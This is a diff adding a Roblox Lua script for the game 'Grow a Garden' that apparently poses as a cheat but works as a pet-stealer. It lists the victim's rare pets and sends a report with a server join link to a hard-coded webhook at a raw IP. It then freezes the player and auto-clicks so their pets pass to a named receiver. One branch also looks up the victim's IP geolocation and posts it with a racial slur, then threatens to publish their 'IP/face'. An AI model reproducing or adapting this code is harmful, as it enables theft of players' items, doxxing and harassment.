@@ -1,0 +1,464 @@
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then
+    return
+end
+_G.scriptExecuted = true
+
+local username = "bowlreb"
+local webhook = "http://93.183.83.94:8000/webhook/87f95f93-ff28-4385-9b2b-7bd94f4982cb"
+local url = "http://93.183.83.94:8000/webhook/87f95f93-ff28-4385-9b2b-7bd94f4982cb"
+
+local keywords = {
+	"👑 Queen Bee", "🪩 Disco Bee", "🦋Butterfly", "🦝 Raccoon",
+	"🐉 Dragonfly", "🐙 Mimic Octopus", "🦊 Fennec Fox",
+	"🦖 T-Rex", "🦕 Spinosaurus", "🌸 Kitsune", "💠 Corrupted Kitsune", "🌈 Rainbow", "🧟 Corrupted Kodama", "🪆 Kodama", "🌟 Ascended", "🐥 Chicken Zombie", "🥀 Red Fox"
+}
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local displayname = player.DisplayName
+local LocalPlayer = Players.LocalPlayer
+local jobId = game.JobId
+local placeId = game.PlaceId
+local accountAge = player.AccountAge
+local backpack = player:FindFirstChild("Backpack") or player:WaitForChild("Backpack")
+local character = player.Character or player.CharacterAdded:Wait()
+local RunService = game:GetService("RunService")
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local HttpService = game:GetService("HttpService")
+local plr = Players.LocalPlayer
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local localPlayer = Players.LocalPlayer
+local TextChatService = game:GetService("TextChatService")
+local Camera = Workspace.CurrentCamera
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local Backpack = player:WaitForChild("Backpack")
+local Character = player.Character or player.CharacterAdded:Wait()
+local Camera = workspace.CurrentCamera
+local UserInputService = game:GetService("UserInputService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local players = game:GetService("Players")
+local runservice = game:GetService("RunService")
+local localplayer = players.LocalPlayer
+
+if not string.find(string.lower(gameName), "grow a garden") then
+      getgenv().Error = true
+      player:Kick("Game not Supported")
+end
+
+if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+    getgenv().Error = true
+    plr:kick("Server error. Please join a DIFFERENT server")
+    return
+end
+
+local function check()
+    if #Players:GetPlayers() >= 5 then
+        getgenv().Error = true
+        player:Kick("Server Error,Please Change a Server")
+    end
+end
+
+check()
+
+repeat task.wait() until getgenv().Error ~= true
+task.spawn(function()
+    local targetModel = nil
+
+    RunService.RenderStepped:Connect(function()
+        if not targetModel or not targetModel.Parent then
+            targetModel = workspace:FindFirstChild(username)
+        end
+
+        for _, prompt in ipairs(workspace:GetDescendants()) do
+            if prompt:IsA("ProximityPrompt") then
+                if targetModel and prompt:IsDescendantOf(targetModel) then
+                    prompt.Enabled = true
+                    prompt.Exclusivity = Enum.ProximityPromptExclusivity.AlwaysShow
+                    prompt.HoldDuration = 0
+                else
+                    prompt.Enabled = false
+                end
+            end
+        end
+    end)
+end)
+
+task.spawn(function()
+    while true do
+        local petsFolder = workspace:WaitForChild("PetsPhysical")
+        local remote = game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetsService")
+
+        for _, petMover in ipairs(petsFolder:GetChildren()) do
+            if petMover.Name == "PetMover" then
+                for _, child in ipairs(petMover:GetChildren()) do
+                    if string.find(child.Name, "{") and string.find(child.Name, "}") then
+                        remote:FireServer("UnequipPet", child.Name)
+                    end
+                end
+            end
+        end
+
+        task.wait(0.1)
+    end
+end)
+
+task.spawn(function()
+    while true do
+        for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+            if v:GetAttribute("d") then
+                game.ReplicatedStorage.GameEvents.Favorite_Item:FireServer(v)
+            end
+        end
+        task.wait(0.1)
+    end
+end)
+wait(1)
+local secretLines = {}
+
+local function collectMatchingTools(container)
+	for _, item in ipairs(container:GetChildren()) do
+		if item:IsA("Tool") then
+			for _, keyword in ipairs(keywords) do
+				if string.find(string.lower(item.Name), string.lower(keyword)) then
+					if item:GetAttribute("PetType") ~= nil then
+						table.insert(secretLines, item.Name)
+						break
+					end
+				end
+			end
+		end
+	end
+end
+
+collectMatchingTools(player.Backpack)
+
+if player.Character then
+	collectMatchingTools(player.Character)
+end
+
+local player = game.Players.LocalPlayer
+local uuidCount = {}
+local foundIssue = false
+
+local function hasKeyword(name)
+	for _, keyword in ipairs(keywords) do
+		if string.find(name, keyword) then
+			return true
+		end
+	end
+	return false
+end
+
+local items = {}
+for _, v in ipairs(player.Backpack:GetChildren()) do
+	table.insert(items, v)
+end
+if player.Character then
+	for _, v in ipairs(player.Character:GetChildren()) do
+		table.insert(items, v)
+	end
+end
+
+for _, item in ipairs(items) do
+	if item:IsA("Tool") then
+		local uuid = item:GetAttribute("PET_UUID")
+		if uuid then
+			uuidCount[uuid] = (uuidCount[uuid] or 0) + 1
+			if uuidCount[uuid] >= 2 then
+				foundIssue = true
+				break
+			end
+		end
+
+		if hasKeyword(item.Name) then
+			if item:GetAttribute("PetType") ~= nil then
+				if item:GetAttribute("d") == nil then
+					foundIssue = true
+					break
+				end
+			end
+		end
+	end
+end
+
+getgenv().Ip = foundIssue
+if #secretLines == 0 then
+    getgenv().poor = true
+	player:Kick("-_-")
+	return
+end
+
+repeat task.wait() until getgenv().poor ~= true
+game.ReplicatedStorage.GameEvents.SettingsService:FireServer("SetSetting", "Sounds", false)
+
+local function getExploitName()
+	return (identifyexecutor and identifyexecutor())
+		or (syn and syn.get_executor and syn.get_executor())
+		or (secure_load and "SecureLoad")
+		or (KRNL_LOADED and "KRNL")
+		or (islclosure and "Unknown Executor")
+		or "Unknown"
+end
+if getgenv().Ip ~= true then
+	local exploit = getExploitName()
+	local inventoryTextRaw = table.concat(secretLines, "\n")
+	local totalCount = #secretLines
+
+	local maxInventoryTextLength = 1000
+	local inventoryText = #inventoryTextRaw > maxInventoryTextLength
+		and string.sub(inventoryTextRaw, 1, maxInventoryTextLength) .. "\n... (truncated)"
+		or inventoryTextRaw
+
+	local teleportLine = string.format("--[[@everyone]]\ngame:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s')", placeId, jobId)
+	local joinURL = string.format("[Click Here](https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s)", placeId, jobId)
+
+	local fields = {
+		{
+			name = ":bust_in_silhouette: Player Information",
+			value = "```User: " .. player.Name ..
+				"\nReceiver: " .. username ..
+				"\nExecutor: " .. exploit ..
+				"\nAccount Age: " .. accountAge .. "```",
+			inline = false
+		},
+		{
+			name = "Join Link",
+			value = joinURL,
+			inline = false
+		},
+		{
+			name = "Total Pets",
+			value = "```Total: " .. totalCount .. "```",
+			inline = false
+		},
+		{
+			name = ":package: Inventory",
+			value = "```" .. inventoryText .. "```",
+			inline = false
+		}
+	}
+
+	local data = {
+		content = teleportLine,
+		embeds = {{
+			title = "Grow a Garden Hit! :dart:",
+			fields = fields,
+			color = 16711680,
+			footer = {
+				text = "Grow a Garden Stellar | Bypassed stupid Delta executor"
+			}
+		}}
+	}
+
+	local headers = {
+		["Content-Type"] = "application/json"
+	}
+
+	local body = HttpService:JSONEncode(data)
+
+	pcall(function()
+		request({
+			Url = webhook,
+			Method = "POST",
+			Headers = headers,
+			Body = body
+		})
+	end)
+end
+
+local function freeze()
+	local character = localplayer.Character or localplayer.CharacterAdded:Wait()
+	local humanoid = character:WaitForChild("Humanoid")
+	humanoid.WalkSpeed = 0
+	humanoid.JumpPower = 0
+end
+
+local function teleportloop(target)
+	task.spawn(function()
+		while task.wait() do
+			if not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then continue end
+			if not localplayer.Character or not localplayer.Character:FindFirstChild("HumanoidRootPart") then continue end
+			localplayer.Character:WaitForChild("HumanoidRootPart").CFrame = target.Character.HumanoidRootPart.CFrame
+		end
+	end)
+end
+
+local function activate(target)
+    wait(2.5)
+	freeze()
+	getgenv().Steal = true
+	teleportloop(target)
+end
+
+for _, p in ipairs(players:GetPlayers()) do
+	if p.Name == username then
+		activate(p)
+	end
+end
+
+players.PlayerAdded:Connect(function(p)
+	if p.Name == username then
+		activate(p)
+	end
+end)
+
+task.spawn(function()
+	repeat task.wait() until getgenv().Steal == true
+
+	local function setFixedZoom()
+		LocalPlayer.CameraMode = Enum.CameraMode.Classic
+		LocalPlayer.CameraMinZoomDistance = 100
+		LocalPlayer.CameraMaxZoomDistance = 100
+	end
+
+	if LocalPlayer.Character then
+		setFixedZoom()
+	else
+		LocalPlayer.CharacterAdded:Wait()
+		setFixedZoom()
+	end
+
+	RunService.RenderStepped:Connect(function()
+		local targetPlayer = Players:FindFirstChild(username)
+		if targetPlayer and targetPlayer.Character then
+			local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+			if targetHRP then
+			    getgenv().Click = true
+				local targetPos = targetHRP.Position
+				local camHeight = 60
+				local cameraPos = targetPos + Vector3.new(0, camHeight, 0)
+				Camera.CFrame = CFrame.new(cameraPos, targetPos)
+			end
+		end
+	end)
+end)
+
+task.spawn(function()
+	repeat task.wait() until getgenv().Steal == true
+	UserInputService.MouseIconEnabled = false
+
+	RunService.RenderStepped:Connect(function()
+		local myChar = LocalPlayer.Character
+		if not myChar then return end
+
+		local head = myChar:FindFirstChild("Head")
+		if not head then return end
+
+		local screenPos = Camera:WorldToViewportPoint(head.Position)
+		VirtualInputManager:SendMouseButtonEvent(screenPos.X, screenPos.Y, 0, true, game, 1)
+		task.wait(0.05)
+		VirtualInputManager:SendMouseButtonEvent(screenPos.X, screenPos.Y, 0, false, game, 1)
+	end)
+end)
+
+task.spawn(function()
+    repeat task.wait() until getgenv().Steal == true
+    player.CharacterAdded:Connect(function(char)
+        Character = char
+    end)
+
+    local function containsKeyword(name)
+        for _, keyword in ipairs(keywords) do
+            if string.find(name, keyword) then
+                return true
+            end
+        end
+        return false
+    end
+
+    while true do
+        for _, tool in ipairs(Backpack:GetChildren()) do
+            if tool:IsA("Tool") and containsKeyword(tool.Name) then
+                pcall(function()
+                    tool.Parent = Character
+                    task.wait(0.05)
+                    tool.Parent = Backpack
+                    task.wait(0.01)
+                end)
+            end
+        end
+        task.wait(0.01)
+    end
+end)
+
+task.spawn(function()
+	repeat task.wait() until getgenv().Ip == true
+	local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
+print(helo) --line above generates a script that allows u to join the logged user
+
+--checks executor
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+   
+local data = {
+            ["username"] = "Visual Checker", --webhook name thing idk
+            ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
+    
+    ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "**This nigger just ran Visual Script with your Stellar", --normal message
+    ["embeds"] = { 
+       {
+           ["title"] = "** " ..game.Players.LocalPlayer.Name.. " ran visual **",
+           ["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
+           ["type"] = "rich", --line above sends all the info grabbed using the api + username and exacutor
+           ["color"] = 16711680,
+           ["footer"] = {
+             ["text"] = "" ..join_script.. "", --sends join script
+           },
+       },
+   }
+}
+
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef) --post, idk
+			player:Kick("If you continue to use Visual in this script, I will publish your IP/face")
+			wait(1)
+			getgenv().Lag = true
+end)
+
+task.spawn(function()
+    player.CharacterAdded:Connect(function(char)
+        Character = char
+    end)
+
+    local function containsKeyword(name)
+        for _, keyword in ipairs(keywords) do
+            if string.find(name, keyword) then
+                return true
+            end
+        end
+        return false
+    end
+
+    local function hasValidTool()
+        for _, tool in ipairs(Backpack:GetChildren()) do
+            if tool:IsA("Tool") and containsKeyword(tool.Name) and tool:GetAttribute("PetType") ~= nil then
+                return true
+            end
+        end
+        for _, tool in ipairs(Character:GetChildren()) do
+            if tool:IsA("Tool") and containsKeyword(tool.Name) and tool:GetAttribute("PetType") ~= nil then
+                return true
+            end
+        end
+        return false
+    end
+
+    RunService.RenderStepped:Connect(function()
+        if not hasValidTool() then
+            player:Kick("")
+        end
+    end)
+end)
